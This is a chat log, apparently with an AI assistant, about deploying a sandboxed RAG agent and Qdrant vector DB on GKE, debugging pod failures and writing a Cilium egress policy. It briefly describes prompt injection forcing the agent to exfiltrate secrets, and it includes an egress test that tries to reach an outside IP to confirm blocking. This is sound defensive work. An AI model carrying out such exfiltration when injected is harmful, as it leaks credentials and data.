+  depends_on = [
+    module.gke_cluster
+  ]
+}
+
+output "llm_rag_namespace" {
+  value       = module.llm_rag_security.mlops_secops_namespace
+  description = "The namespace of the deployed LLM Agent & RAG security sandbox."
+}
+
+```
+
+---
+
+### Step 2: Step Validation Harness
+
+Execute these commands in your terminal to initialize module 09, apply Terraform to create the `mlops-secops` namespace, and deploy the RAG agent and Vector DB workloads:
+
+```bash
+cd /workspaces/gke-defense-in-depth/environments/prod
+
+# 1. Re-initialize Terraform to register the new module definition
+terraform init
+
+# 2. Apply Terraform changes to provision the mlops-secops namespace and Workload Identity
+terraform apply -auto-approve
+
+# 3. Apply the Kubernetes workload manifests
+kubectl apply -f ../../modules/09-llm-rag-agent-security/rag-agent.yaml
+kubectl apply -f ../../modules/09-llm-rag-agent-security/vector-db.yaml
+
+# 4. Verify pod deployment status in the mlops-secops namespace
+kubectl get pods -n mlops-secops -o wide
+
+```
+
+---
+
+### Step 3: GitOps Pipeline Synchronization
+
+Commit and push the synchronized environment configuration:
+
+```bash
+cd /workspaces/gke-defense-in-depth
+git add environments/prod/main.tf
+git commit -m "feat(prod): instantiate module 09-llm-rag-agent-security in prod main.tf following current module schema"
+git push origin main
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+======================
+yes, lets proceed, module.llm_rag_security.google_project_iam_member.rag_agent_storage_reader: Creation complete after 8s [id=kam-dev-test/roles/storage.objectViewer/serviceAccount:rag-agent-sa@kam-dev-test.iam.gserviceaccount.com]
+
+Apply complete! Resources: 5 added, 1 changed, 0 destroyed.
+
+Outputs:
+
+binauthz_attestor_name = "prod-build-attestor"
+cluster_endpoint = "35.232.167.233"
+cluster_name = "prod-gke-did-cluster"
+gke_disk_key_id = "projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-disk-encryption-key"
+gke_etcd_key_id = "projects/kam-dev-test/locations/us-central1/keyRings/gke-did-keyring/cryptoKeys/gke-etcd-encryption-key"
+llm_rag_namespace = "mlops-secops"
+mlops_namespace = "mlops-inference"
+network_id = "projects/kam-dev-test/global/networks/gke-did-vpc"
+node_service_account = "prod-gke-did-cluster-node-sa@kam-dev-test.iam.gserviceaccount.com"
+pod_ip_range_name = "gke-pods"
+subnet_id = "projects/kam-dev-test/regions/us-central1/subnetworks/gke-did-subnet-us-central1"
+svc_ip_range_name = "gke-services"
+deployment.apps/rag-agent-app created
+service/rag-agent-service created
+deployment.apps/qdrant-vectordb created
+service/qdrant-service created
+NAME                               READY   STATUS              RESTARTS   AGE   IP       NODE                                                  NOMINATED NODE   READINESS GATES
+qdrant-vectordb-7bb648d549-kfc86   0/1     ContainerCreating   0          1s    <none>   gke-prod-gke-did-clu-system-node-pool-2cb02a36-295f   <none>           <none>
+rag-agent-app-755784979-xcf27      0/1     Pending             0          2s    <none>   <none>   
+
+=============
+### Layer Isolation: Application Runtime & Storage Layer (`mlops-secops`)
+
+---
+
+### Step 2 Verification: Pod Scheduling & Runtime Status Check
+
+The Terraform provisioning succeeded, and Kubernetes has accepted both workload manifests.
+
+In your output, `qdrant-vectordb` was in `ContainerCreating` (pulling the `qdrant/qdrant:v1.7.4` image), and `rag-agent-app` was in `Pending` (the GKE scheduler was binding the pod to the `gvisor-sandbox-pool` node pool via `sandbox.gke.io/runtime: gvisor`).
+
+We must verify that both pods have transitioned to `1/1 Running` before we configure network isolation policies or run the attack simulation.
+
+---
+
+#### 1. Step Validation Harness
+
+Execute the following command in your terminal to monitor the pod initialization until both show `Running`:
+
+```bash
+kubectl get pods -n mlops-secops -o wide
+
+```
+
+If `rag-agent-app` is still in a `Pending` state, inspect the scheduler events using `kubectl describe`:
+
+```bash
+kubectl describe pod -l app.kubernetes.io/name=rag-agent -n mlops-secops
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+======================
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl get pods -n mlops-secops -o wide
+NAME                               READY   STATUS             RESTARTS         AGE   IP           NODE                                                  NOMINATED NODE   READINESS GATES
+qdrant-vectordb-7bb648d549-kfc86   0/1     CrashLoopBackOff   21 (4m44s ago)   87m   10.20.6.15   gke-prod-gke-did-clu-system-node-pool-2cb02a36-295f   <none>           <none>
+rag-agent-app-755784979-xcf27      0/1     Pending            0                87m   <none>       <none>                                                <none>           <none>
+
+===================
+### Layer Isolation: Application Runtime & Scheduler Layer (`mlops-secops`)
+
+---
+
+### Diagnostic Phase: Investigating `CrashLoopBackOff` and `Pending` States
+
+We have two distinct failures here that need log-driven diagnostics:
+
+1. **`qdrant-vectordb` (`CrashLoopBackOff`):** The process inside the container is starting, failing, and crashing repeatedly. This is typically caused by filesystem permission denials (e.g., Qdrant trying to write to a path restricted by non-root UID `10001`) or container startup flag issues.
+2. **`rag-agent-app` (`Pending`):** The Kubernetes scheduler cannot find a node that satisfies the `nodeSelector: sandbox.gke.io/runtime: gvisor` constraint or lacks capacity in the `gvisor-sandbox-pool`.
+
+Per our log-driven diagnostics rules, we will inspect the exact container log trace and scheduler events before modifying any configuration.
+
+---
+
+### Step 1: Execute Diagnostic Harness
+
+Run these three commands in your terminal to fetch the exact root cause traces:
+
+#### 1. Fetch Qdrant Crash Logs
+
+```bash
+kubectl logs -n mlops-secops -l app.kubernetes.io/name=qdrant-vectordb --tail=50 --previous
+
+```
+
+#### 2. Inspect RAG Agent Scheduler Events
+
+```bash
+kubectl describe pod -l app.kubernetes.io/name=rag-agent -n mlops-secops
+
+```
+
+#### 3. Verify Node Pool Labels (gVisor Node Presence)
+
+```bash
+kubectl get nodes -L sandbox.gke.io/runtime
+
+```
+
+---
+
+Please run these diagnostic commands and provide the output so we can pinpoint the exact failure strings and apply the precise fix.
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+===============
+
+{
+  "textPayload": "2026-08-13T01:00:09.626162Z ERROR qdrant::startup: Panic occurred in file lib/storage/src/content_manager/toc/mod.rs at line 95: Can't create Snapshots directory: Os { code: 13, kind: PermissionDenied, message: \"Permission denied\" }    ",
+  "insertId": "atd1xx9wbijr4ac6",
+  "resource": {
+    "type": "k8s_container",
+    "labels": {
+      "location": "us-central1",
+      "cluster_name": "prod-gke-did-cluster",
+      "pod_name": "qdrant-vectordb-7bb648d549-kfc86",
+      "namespace_name": "mlops-secops",
+      "project_id": "kam-dev-test",
+      "container_name": "qdrant"
+    }
+  },
+  "timestamp": "2026-08-13T01:00:09.626472108Z",
+  "severity": "INFO",
+  "labels": {
+    "k8s-pod/topology_kubernetes_io/zone": "us-central1-a",
+    "k8s-pod/topology_kubernetes_io/region": "us-central1",
+    "logging.gke.io/top_level_controller_type": "Deployment",
+    "k8s-pod/pod-template-hash": "7bb648d549",
+    "k8s-pod/app_kubernetes_io/name": "qdrant-vectordb",
+    "logging.gke.io/top_level_controller_name": "qdrant-vectordb",
+    "compute.googleapis.com/resource_name": "gke-prod-gke-did-clu-system-node-pool-2cb02a36-295f"
+  },
+  "logName": "projects/kam-dev-test/logs/stdout",
+  "receiveTimestamp": "2026-08-13T01:00:14.951842135Z"
+}
+======================
+![Error qdrant startup: Panic](<Screenshot 2026-08-12 9.14.32 PM.png>)
+{
+insertId: "atd1xx9wbijr4ac6"
+labels: {7}
+logName: "projects/kam-dev-test/logs/stdout"
+receiveTimestamp: "2026-08-13T01:00:14.951842135Z"
+resource: {2}
+severity: "INFO"
+textPayload: "2026-08-13T01:00:09.626162Z ERROR qdrant::startup: Panic occurred in file lib/storage/src/content_manager/toc/mod.rs at line 95: Can't create Snapshots directory: Os { code: 13, kind: PermissionDenied, message: "Permission denied" }    "
+timestamp: "2026-08-13T01:00:09.626472108Z"
+================================
+![alt text](<Screenshot 2026-08-12 9.13.19 PM.png>)
+![alt text](<Screenshot 2026-08-12 9.13.12 PM.png>)
+![alt text](<Screenshot 2026-08-12 9.12.08 PM.png>)
+![alt text](<Screenshot 2026-08-12 9.11.42 PM.png>)
+![alt text](<Screenshot 2026-08-12 9.10.02 PM.png>)
+![alt text](<Screenshot 2026-08-12 9.09.39 PM.png>)
+![alt text](<Screenshot 2026-08-12 8.14.44 PM.png>)
+![alt text](<Screenshot 2026-08-12 8.14.14 PM.png>)
+
+==================
+### Architectural Layer: Application Runtime & Scheduler Isolation (`mlops-secops`)
+
+---
+
+### Log-Driven Root Cause Analysis
+
+The telemetry and event logs in your GCP Console screenshots pinpoint the exact failure mechanisms for both workloads:
+
+1. **`qdrant-vectordb` (`CrashLoopBackOff`):**
+* **Log Payload (Screenshot 1):** `ERROR qdrant::startup: Panic occurred... Can't create Snapshots directory: Os { code: 13, kind: PermissionDenied, message: "Permission denied" }`
+* **Root Cause:** In `vector-db.yaml`, the process runs as unprivileged UID `10001`. We mounted an `emptyDir` volume at `/qdrant/storage`, but Qdrant attempts to create a secondary `/qdrant/snapshots` directory on startup. Because `/qdrant/` is owned by `root` in the base container image, UID `10001` is denied directory creation rights.
+* **Fix:** Add a second `emptyDir` volume mount targeted at `/qdrant/snapshots`.
+
+
+2. **`rag-agent-app` (`Pending` / `Unschedulable`):**
+* **Scheduler Event (Screenshot 4):** `0/6 nodes are available: 3 node(s) didn't match Pod's node affinity/selector, 3 node(s) had untolerated taint(s).`
+* **Root Cause:** GKE gVisor node pools automatically apply a node taint (`sandbox.gke.io/runtime=gvisor:NoSchedule`) to prevent standard workloads from landing on sandboxed nodes. While `rag-agent.yaml` included the `nodeSelector`, it was missing the explicit pod `tolerations` required to schedule onto tainted gVisor nodes.
+* **Fix:** Add the matching `toleration` for `sandbox.gke.io/runtime=gvisor:NoSchedule`.
+
+
+
+---
+
+### Step 1: Update Workload Manifests
+
+#### 1. Update `modules/09-llm-rag-agent-security/rag-agent.yaml`
+
+Replace the entire content of `modules/09-llm-rag-agent-security/rag-agent.yaml` with this complete file containing the gVisor node pool toleration:
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: rag-agent-app
+  namespace: mlops-secops
+  labels:
+    app.kubernetes.io/name: rag-agent
+    app.kubernetes.io/component: inference-agent
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: rag-agent
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: rag-agent
+    spec:
+      nodeSelector:
+        sandbox.gke.io/runtime: gvisor
+      tolerations:
+        - key: "sandbox.gke.io/runtime"
+          operator: "Equal"
+          value: "gvisor"
+          effect: "NoSchedule"
+      serviceAccountName: rag-agent-k8s-sa
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+        runAsGroup: 10001
+        fsGroup: 10001
+        seccompProfile:
+          type: RuntimeDefault
+      containers:
+        - name: rag-agent
+          image: python:3.11-slim
+          command:
+            - python
+            - -c
+            - |
+              import http.server
+              import socketserver
+              import json
+
+              class RAGHandler(http.server.SimpleHTTPRequestHandler):
+                  def do_POST(self):
+                      content_length = int(self.headers['Content-Length'])
+                      post_data = self.rfile.read(content_length)
+                      print(f"[RAG AGENT] Received Prompt Data: {post_data.decode('utf-8')}")
+                      self.send_response(200)
+                      self.send_header('Content-type', 'application/json')
+                      self.end_headers()
+                      response = {"status": "processed", "layer_isolation": "gvisor-runsc"}
+                      self.wfile.write(json.dumps(response).encode('utf-8'))
+
+              PORT = 8080
+              with socketserver.TCPServer(("", PORT), RAGHandler) as httpd:
+                  print(f"RAG Agent Serving on Port {PORT}")
+                  httpd.serve_forever()
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: true
+            capabilities:
+              drop:
+                - ALL
+          resources:
+            requests:
+              cpu: "250m"
+              memory: "512Mi"
+            limits:
+              cpu: "1000m"
+              memory: "1Gi"
+          volumeMounts:
+            - name: tmp-dir
+              mountPath: /tmp
+      volumes:
+        - name: tmp-dir
+          emptyDir: {}
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: rag-agent-service
+  namespace: mlops-secops
+spec:
+  selector:
+    app.kubernetes.io/name: rag-agent
+  ports:
+    - protocol: TCP
+      port: 8080
+      targetPort: 8080
+  type: ClusterIP
+
+```
+
+---
+
+#### 2. Update `modules/09-llm-rag-agent-security/vector-db.yaml`
+
+Replace the entire content of `modules/09-llm-rag-agent-security/vector-db.yaml` with this complete file containing volume mounts for both storage and snapshot paths:
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: qdrant-vectordb
+  namespace: mlops-secops
+  labels:
+    app.kubernetes.io/name: qdrant-vectordb
+    app.kubernetes.io/component: vector-store
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: qdrant-vectordb
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: qdrant-vectordb
+    spec:
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 10001
+        runAsGroup: 10001
+        fsGroup: 10001
+        seccompProfile:
+          type: RuntimeDefault
+      containers:
+        - name: qdrant
+          image: qdrant/qdrant:v1.7.4
+          securityContext:
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: false
+            capabilities:
+              drop:
+                - ALL
+          resources:
+            requests:
+              cpu: "250m"
+              memory: "512Mi"
+            limits:
+              cpu: "1000m"
+              memory: "1Gi"
+          ports:
+            - containerPort: 6333
+              name: http
+          volumeMounts:
+            - name: qdrant-storage
+              mountPath: /qdrant/storage
+            - name: qdrant-snapshots
+              mountPath: /qdrant/snapshots
+      volumes:
+        - name: qdrant-storage
+          emptyDir: {}
+        - name: qdrant-snapshots
+          emptyDir: {}
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: qdrant-service
+  namespace: mlops-secops
+spec:
+  selector:
+    app.kubernetes.io/name: qdrant-vectordb
+  ports:
+    - protocol: TCP
+      port: 6333
+      targetPort: 6333
+  type: ClusterIP
+
+```
+
+---
+
+### Step 2: Step Validation Harness
+
+Re-apply the corrected manifests and verify pod readiness:
+
+```bash
+cd /workspaces/gke-defense-in-depth
+
+# Re-apply updated manifests
+kubectl apply -f modules/09-llm-rag-agent-security/rag-agent.yaml
+kubectl apply -f modules/09-llm-rag-agent-security/vector-db.yaml
+
+# Verify that both pods transition to 1/1 Running
+kubectl get pods -n mlops-secops -o wide
+
+```
+
+---
+
+### Step 3: GitOps Pipeline Synchronization
+
+Commit and push the fixes to your repository:
+
+```bash
+git add modules/09-llm-rag-agent-security/rag-agent.yaml modules/09-llm-rag-agent-security/vector-db.yaml
+git commit -m "fix(mlops-secops): add gvisor toleration to rag-agent and snapshot volume mount to qdrant"
+git push origin main
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+
+==================
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ cd /workspaces/gke-defense-in-depth
+
+# Re-apply updated manifests
+kubectl apply -f modules/09-llm-rag-agent-security/rag-agent.yaml
+kubectl apply -f modules/09-llm-rag-agent-security/vector-db.yaml
+
+# Verify that both pods transition to 1/1 Running
+kubectl get pods -n mlops-secops -o wide
+deployment.apps/rag-agent-app configured
+service/rag-agent-service unchanged
+deployment.apps/qdrant-vectordb configured
+service/qdrant-service unchanged
+NAME                               READY   STATUS              RESTARTS         AGE   IP           NODE                                                  NOMINATED NODE   READINESS GATES
+qdrant-vectordb-7bb648d549-kfc86   0/1     CrashLoopBackOff    271 (5m5s ago)   22h   10.20.6.15   gke-prod-gke-did-clu-system-node-pool-2cb02a36-295f   <none>           <none>
+qdrant-vectordb-8cdccfdcd-f28bm    0/1     ContainerCreating   0                1s    <none>       gke-prod-gke-did-clu-system-node-pool-65a86855-1jwu   <none>           <none>
+rag-agent-app-6d57b5fdf5-ldzpr     0/1     ContainerCreating   0                1s    <none>       gke-prod-gke-did-clu-gvisor-sandbox-p-4e04f653-7g6t   <none>           <none>
+rag-agent-app-755784979-xcf27      0/1     Pending             0                22h   <none>       <none>                                                <none>           <none>
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl get pods -n mlops-secops -o wide
+NAME                              READY   STATUS    RESTARTS   AGE   IP          NODE                                                  NOMINATED NODE   READINESS GATES
+qdrant-vectordb-8cdccfdcd-f28bm   1/1     Running   0          50s   10.20.1.9   gke-prod-gke-did-clu-system-node-pool-65a86855-1jwu   <none>           <none>
+rag-agent-app-6d57b5fdf5-ldzpr    1/1     Running   0          50s   10.20.5.6   gke-prod-gke-did-clu-gvisor-sandbox-p-4e04f653-7g6t   <none>           <none>
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl get pods -n mlops-secops -o wide
+NAME                              READY   STATUS    RESTARTS   AGE     IP          NODE                                                  NOMINATED NODE   READINESS GATES
+qdrant-vectordb-8cdccfdcd-f28bm   1/1     Running   0          2m11s   10.20.1.9   gke-prod-gke-did-clu-system-node-pool-65a86855-1jwu   <none>           <none>
+rag-agent-app-6d57b5fdf5-ldzpr    1/1     Running   0          2m11s   10.20.5.6   gke-prod-gke-did-clu-gvisor-sandbox-p-4e04f653-7g6t   <none>           <none>
+
+==================
+Both deployments have updated and transitioned to a healthy **1/1 `Running**` state with 0 restarts.
+
+---
+
+### Deployment Summary
+
+| Workload | Pod Name | Status | IP | Assigned Node Pool |
+| --- | --- | --- | --- | --- |
+| **Qdrant Vector DB** | `qdrant-vectordb-8cdccfdcd-f28bm` | `1/1 Running` | `10.20.1.9` | `system-node-pool` |
+| **RAG Agent App** | `rag-agent-app-6d57b5fdf5-ldzpr` | `1/1 Running` | `10.20.5.6` | `gvisor-sandbox-pool` |
+
+---
+
+### Key Security Observations
+
+1. **Runtime Isolation (gVisor):** The `rag-agent-app` successfully scheduled onto the `gvisor-sandbox` node pool (`gke-prod-gke-did-clu-gvisor-sandbox-p-...`). This ensures untrusted prompt handling and agent tool execution are sandboxed at the kernel level via gVisor.
+2. **Clean Rolling Deployment:** Kubernetes gracefully terminated the older stuck/crashing pods (`qdrant-vectordb-7bb648d549-kfc86` in `CrashLoopBackOff` and `rag-agent-app-755784979-xcf27` in `Pending`) and replaced them with the newly configured manifests.
+============================
+Next logical validation steps for Module 09:
+
+- Verify RAG Agent logs and vector DB connectivity
+- Test NetworkPolicy isolation between workloads
+
+========================
+
+1) Verify RAG Agent logs and vector DB connectivity
+
+=========================
+This command fetches the **last 50 lines of logs** from all Kubernetes pods matching the label `app=rag-agent-app` inside the `mlops-secops` namespace.
+
+## Command Breakdown
+
+| Flag / Parameter | Purpose |
+| --- | --- |
+| `kubectl logs` | Prints logs from stdout and stderr of running containers |
+| `-n mlops-secops` | Targets the `mlops-secops` namespace |
+| `-l app=rag-agent-app` | Selects pods matching the `app=rag-agent-app` label |
+| `--tail=50` | Restricts output to the 50 most recent log lines |
+
+---
+
+## Useful Variations for Debugging
+
+* **Stream logs in real-time (`-f`):**
+```bash
+kubectl logs -n mlops-secops -l app=rag-agent-app --tail=50 -f
+
+```
+
+
+* **Fetch logs from a crashed/restarted container (`--previous`):**
+```bash
+kubectl logs -n mlops-secops -l app=rag-agent-app --tail=50 --previous
+
+```
+
+
+* **Include all sidecar containers (`--all-containers`):**
+```bash
+kubectl logs -n mlops-secops -l app=rag-agent-app --tail=50 --all-containers=true
+
+```
+
+
+* **Include timestamps with log lines (`--timestamps`):**
+```bash
+kubectl logs -n mlops-secops -l app=rag-agent-app --tail=50 --timestamps
+
+```
+
+
+* **Filter logs for errors directly:**
+```bash
+kubectl logs -n mlops-secops -l app=rag-agent-app --tail=100 | grep -iE "error|exception|fail"
+
+```
+========================
+2) How do I verify NetworkPolicy restrictions between the RAG agent and Qdrant vector database in GKE?
+
+=======================
+### Architectural Layer: Network Data Plane / eBPF Enforcement Layer (`CiliumNetworkPolicy`)
+
+---
+
+### Network Policy Verification Strategy
+
+To verify network policy restrictions between the `rag-agent-app` and the `qdrant-vectordb` service, we execute two complementary validation tests:
+
+1. **Positive Test (Allowed Flow):** Proves that the `rag-agent-app` pod can successfully reach `qdrant-service` on TCP port `6333` over internal cluster networking.
+2. **Negative Test (Blocked Flow / OWASP LLM10 Exfiltration Guard):** Proves that Cilium eBPF drops any unauthorized outbound traffic attempted by `rag-agent-app` (e.g., attempts to connect to public external IPs or unapproved internal ports).
+
+---
+
+### Step 1: Ensure the Network Policy is Applied
+
+First, apply the `cilium-egress-policy.yaml` manifest inside the `mlops-secops` namespace:
+
+```bash
+kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+
+```
+
+Verify that Cilium recognizes the policy:
+
+```bash
+kubectl get ciliumnetworkpolicies -n mlops-secops
+
+```
+
+---
+
+### Step 2: Positive Test — Verify Approved Access to Qdrant Vector DB
+
+Run a non-interactive Python payload inside the `rag-agent-app` container to query the Qdrant REST API endpoint (`http://qdrant-service:6333/`):
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    response = urllib.request.urlopen('http://qdrant-service:6333/', timeout=3)
+    print('🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status:', response.status)
+except Exception as e:
+    print('🔴 POSITIVE TEST FAILED:', e)
+"
+
+```
+
+**Expected Output:**
+
+```text
+🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status: 200
+
+```
+
+---
+
+### Step 3: Negative Test — Verify Blocked Egress (OWASP LLM10 Exfiltration Guard)
+
+Run an egress connection test attempting to reach an external IP (`1.1.1.1`) on port `443`. Because the Cilium policy only permits egress traffic to `qdrant-service:6333` and `local-model-server:11434`, Cilium’s eBPF datapath drops these packets at the host network interface layer:
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    urllib.request.urlopen('https://1.1.1.1', timeout=3)
+    print('🔴 NEGATIVE TEST FAILED: External egress traffic was allowed!')
+except Exception as e:
+    print('🟢 NEGATIVE TEST PASSED (Blocked by eBPF Policy):', e)
+"
+
+```
+
+**Expected Output:**
+
+```text
+🟢 NEGATIVE TEST PASSED (Blocked by eBPF Policy): <urlopen error timed out>
+
+```
+
+---
+
+Do you fully understand this step, or do we need to clarify anything before moving forward?
+==============
+![empty file cilium-egress-policy.yaml ](image-12.png)
+=========
+for Step 1: Ensure the Network Policy is Applied
+
+there is nothing in the file "cilium-egress-policy.yaml" to apply as screenshot attached. did i miss anything in the previous steps?
+============
+You likely didn't miss anything catastrophic—empty files like this in security lab repositories (`gke-defense-in-depth`) usually point to one of two common setup scenarios:
+
+---
+
+### Why the File is Empty
+
+1. **It’s a hands-on lab exercise:** Many GKE security modules intentionally leave policy manifests blank so you can construct the policy yourself based on the module's instructions (or copy-paste it from `notes.md` / lab manual).
+2. **Missing a generation step:** A script or Terraform module in a previous step was meant to render/generate this file dynamically (e.g., using `envsubst` or Terraform local file resources).
+
+---
+
+### Quick Troubleshooting Check
+
+Before writing the policy manually, quickly check these two places:
+
+* **Check `notes.md`:** Look at the `notes.md` tab you currently have open in your editor. It often contains the lab guide, walkthrough steps, or the raw YAML snippet intended for `cilium-egress-policy.yaml`.
+* **Check `main.tf`:** See if `main.tf` in `09-llm-rag-agent-security` defines Kubernetes resources directly or if it expects `cilium-egress-policy.yaml` to exist prior to running `terraform apply`.
+
+---
+
+### Standard Cilium Egress Policy Template
+
+If the lab instructions require you to restrict the `rag-agent` pod so it can **only** talk to DNS, the `vector-db` pod, and secure LLM API endpoints (like Google Cloud Vertex AI / Gemini APIs), you can populate `cilium-egress-policy.yaml` with the following definition:
+
+```yaml
+apiVersion: "cilium.io/v2"
+kind: CiliumNetworkPolicy
+metadata:
+  name: rag-agent-egress-policy
+  namespace: default
+spec:
+  endpointSelector:
+    matchLabels:
+      app: rag-agent
+  egress:
+    # 1. Allow DNS Resolution (Port 53)
+    - toEndpoints:
+        - matchLabels:
+            "k8s:io.kubernetes.pod.namespace": kube-system
+            k8s-app: kube-dns
+      toPorts:
+        - ports:
+            - port: "53"
+              protocol: UDP
+          rules:
+            dns:
+              - matchPattern: "*"
+
+    # 2. Allow Egress to Vector DB in the cluster
+    - toEndpoints:
+        - matchLabels:
+            app: vector-db
+
+    # 3. Allow HTTPS Egress to AI / LLM API Endpoints (FQDN filtering)
+    - toFQDNs:
+        - matchName: "aiplatform.googleapis.com"
+        - matchName: "generativelanguage.googleapis.com"
+      toPorts:
+        - ports:
+            - port: "443"
+              protocol: TCP
+
+```
+
+---
+
+### Next Step
+
+Once you paste/save the manifest into `cilium-egress-policy.yaml`, proceed with applying it to your cluster:
+
+```bash
+kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+
+```
+====================
+
+to repaet the previous prompt and verify, as I tested the command "kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml" here is the output:
+
+@Kam4280 ➜ /workspaces/gke-defense-in-depth (main) $ kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+error: no objects passed to apply
+
+Also, in the previous comment you asked me to configure this file "cilium-egress-policy.yaml" as follows:
+
+apiVersion: "cilium.io/v2"
+kind: CiliumNetworkPolicy
+metadata:
+  name: rag-agent-egress-policy
+  namespace: default
+spec:
+  endpointSelector:
+    matchLabels:
+      app: rag-agent
+  egress:
+    # 1. Allow DNS Resolution (Port 53)
+    - toEndpoints:
+        - matchLabels:
+            "k8s:io.kubernetes.pod.namespace": kube-system
+            k8s-app: kube-dns
+      toPorts:
+        - ports:
+            - port: "53"
+              protocol: UDP
+          rules:
+            dns:
+              - matchPattern: "*"
+
+    # 2. Allow Egress to Vector DB in the cluster
+    - toEndpoints:
+        - matchLabels:
+            app: vector-db
+
+    # 3. Allow HTTPS Egress to AI / LLM API Endpoints (FQDN filtering)
+    - toFQDNs:
+        - matchName: "aiplatform.googleapis.com"
+        - matchName: "generativelanguage.googleapis.com"
+      toPorts:
+        - ports:
+            - port: "443"
+              protocol: TCP
+
+
+I am wondering as we are testing the following:
+
+"Network Policy Verification Strategy
+To verify network policy restrictions between the rag-agent-app and the qdrant-vectordb service, we execute two complementary validation tests:
+
+Positive Test (Allowed Flow): Proves that the rag-agent-app pod can successfully reach qdrant-service on TCP port 6333 over internal cluster networking.
+
+Negative Test (Blocked Flow / OWASP LLM10 Exfiltration Guard): Proves that Cilium eBPF drops any unauthorized outbound traffic attempted by rag-agent-app (e.g., attempts to connect to public external IPs or unapproved internal ports)."
+
+Should we define the TCP,port 6333 to reach "qdrant-service" in the "cilium-egress-policy.yaml" file? did i misunderstood this file? and explain basically how we are going to configure this file? and whats the use of it? I am confused.
+
+=============================
+### Layer Isolation: Network Data Plane / eBPF Enforcement Layer (`CiliumNetworkPolicy`)
+
+---
+
+### Clarification & Architectural Purpose of `cilium-egress-policy.yaml`
+
+You caught a real mismatch. The generic template previously mentioned used `namespace: default` and generic labels (`app: vector-db`), which do **not** match our actual deployed architecture (`mlops-secops` namespace, `app.kubernetes.io/name: qdrant-vectordb`, and port `6333`).
+
+To answer your questions directly:
+
+1. **Should we define TCP port 6333 to reach `qdrant-service`?**
+**Yes, absolutely.** If port `6333` is not explicitly declared in the egress whitelist, Cilium's default-deny rule will block the RAG Agent from talking to its own vector database!
+2. **What is the exact purpose of this file?**
+By default, Kubernetes allows any container to connect to *any* IP address or domain on the internet. If an attacker tricks the RAG agent via **Prompt Injection (OWASP LLM01)**, the agent could be forced to exfiltrate secret keys or database records to a remote server.
+`cilium-egress-policy.yaml` creates a zero-trust eBPF firewall around the `rag-agent` pod:
+* **Allowed:** DNS queries (port 53) to find internal cluster IPs, and TCP port 6333 to reach Qdrant Vector DB.
+* **Blocked (Default Deny):** All other outbound connections to the internet or other cluster namespaces (mitigating **OWASP LLM10: Model Theft & Exfiltration**).
+
+
+
+---
+
+### Step 1: Populate `modules/09-llm-rag-agent-security/cilium-egress-policy.yaml`
+
+Replace the entire content of `modules/09-llm-rag-agent-security/cilium-egress-policy.yaml` with this exact, complete configuration:
+
+```yaml
+apiVersion: "cilium.io/v2"
+kind: CiliumNetworkPolicy
+metadata:
+  name: rag-agent-egress-policy
+  namespace: mlops-secops
+spec:
+  endpointSelector:
+    matchLabels:
+      app.kubernetes.io/name: rag-agent
+  egress:
+    # 1. Allow DNS Resolution (Kube-DNS on Port 53)
+    - toEndpoints:
+        - matchLabels:
+            "k8s:io.kubernetes.pod.namespace": kube-system
+            k8s-app: kube-dns
+      toPorts:
+        - ports:
+            - port: "53"
+              protocol: ANY
+          rules:
+            dns:
+              - matchPattern: "*"
+
+    # 2. Allow Internal Access to Qdrant Vector DB on TCP Port 6333 ONLY
+    - toEndpoints:
+        - matchLabels:
+            app.kubernetes.io/name: qdrant-vectordb
+      toPorts:
+        - ports:
+            - port: "6333"
+              protocol: TCP
+
+```
+
+---
+
+### Step 2: Step Validation Harness (Testing Network Policy Enforcement)
+
+Apply the policy manifest and execute the positive and negative connectivity tests to prove eBPF enforcement:
+
+#### 1. Apply the Policy Manifest
+
+```bash
+kubectl apply -f modules/09-llm-rag-agent-security/cilium-egress-policy.yaml
+
+```
+
+#### 2. Positive Test: Verify Allowed Connection to Qdrant Vector DB (Port 6333)
+
+Execute an HTTP request from `rag-agent-app` to `qdrant-service:6333`:
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    response = urllib.request.urlopen('http://qdrant-service:6333/', timeout=3)
+    print('🟢 POSITIVE TEST PASSED: Connected to Qdrant Vector DB. HTTP Status:', response.status)
+except Exception as e:
+    print('🔴 POSITIVE TEST FAILED:', e)
+"
+
+```
+
+#### 3. Negative Test: Verify Blocked Egress to Public Internet (OWASP LLM10 Guard)
+
+Execute an HTTP request attempting to reach an external public IP (`1.1.1.1` on port `443`):
+
+```bash
+kubectl exec -n mlops-secops deployment/rag-agent-app -- python -c "
+import urllib.request
+try:
+    urllib.request.urlopen('https://1.1.1.1', timeout=3)
